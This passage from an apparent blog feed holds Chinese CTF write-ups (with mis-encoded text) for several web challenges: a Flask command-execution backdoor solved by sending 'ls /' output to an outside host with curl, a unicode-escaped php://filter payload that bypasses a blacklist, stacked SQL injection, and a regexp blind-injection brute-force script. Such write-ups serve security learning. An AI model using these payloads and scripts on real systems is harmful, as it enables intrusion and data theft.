class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>fuzzå¾—åˆ°SECRET_KEY</p><p><img src="/../images/image-20240304181830119.png" alt="image-20240304181830119"></p><p>curlå¤–å¸¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=xBkXb5RQ0BFm83FhqDFzIKhg5VEptG8b8ICi7/RqACc=&amp;shell=curl IP:PORT/`ls /|base64`</span><br></pre></td></tr></table></figure><p>éé¢„æœŸç›´æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/flag</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240304182037065.png" alt="image-20240304182037065"></p><h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_valid</span>(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !<span class="title function_ invoke__">is_valid</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]); </span><br></pre></td></tr></table></figure><p>ä»¥jsonå½¢å¼ä¼ å…¥page,ä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ç”¨Unicodeç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;  &quot;page&quot;:&quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240304203603702.png" alt="image-20240304203603702"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-multiSQL"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-multiSQL" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]multiSQL"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]multiSQL</h1><p>äºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯updateè¢«è¿‡æ»¤ï¼Œä½¿ç”¨replace into æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;replace into score values(&#x27;ç«å&#x27;,999,999,999);#111&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ä¼šä½¿å¾—è¡¨ä¸­å‡ºç°é‡å¤æ•°æ®ï¼Œåˆ é™¤ä½åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;delete from score where listen=11;#111&#x27;</span><br></pre></td></tr></table></figure><p>æœ€åéªŒè¯</p><p><img src="/../images/image-20240305172610038.png" alt="image-20240305172610038"></p><h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p>hint.txté»‘åå•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>ç™»å½•çš„å¯†ç ç­‰äºadminçš„å¯†ç å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯adminè¢«è¿‡æ»¤</p><p>æ„é€ æ­£åˆ™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^x&quot;;%00</span><br></pre></td></tr></table></figure><p>ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where passwd regexp &quot;^x&quot;;</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://40b1b73a-7f91-47bf-aa91-34652a137245.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">fuzz_dict=string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzz_dict:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>(pwd+i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            pwd += i</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€ä¸ªçˆ†ç ´å¯†ç çš„æ¯ä¸€ä½</p><p><img src="/../images/image-20240308151934081.png" alt="image-20240308151934081"></p><p>æœ€åç™»å½•</p><p><img src="/../images/image-20240308151950612.png" alt="image-20240308151950612"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NISACTF-2022-popchains&quot;&gt;&lt;a href=&quot;#NISACTF-2022-popchains&quot; class=&quot;headerlink&quot; title=&quot;[NISACTF 2022]popchains&quot;&gt;&lt;/a&gt;[NISACTF 2022]popch</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
